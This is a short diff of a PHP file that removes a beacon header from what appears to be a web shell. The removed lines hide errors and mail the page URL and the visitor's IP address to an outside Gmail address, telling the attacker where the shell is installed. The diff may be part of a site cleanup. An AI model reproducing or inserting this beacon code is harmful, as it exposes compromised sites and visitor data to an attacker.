@@ -1,23 +1,4 @@
-<?php
-//coded by Hekerman 
-//Maklo heker
-//ganti $tujuanemail ya zeyenk
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'rootcyberpunks@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "MAKLO HEKER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
- 
-if(get_magic_quotes_gpc()){
-foreach($_POST as $key=>$value){
-$_POST[$key] = stripslashes($value);
-}
-}
-?>
+
 <?php
 @session_start();
 @set_time_limit(0);
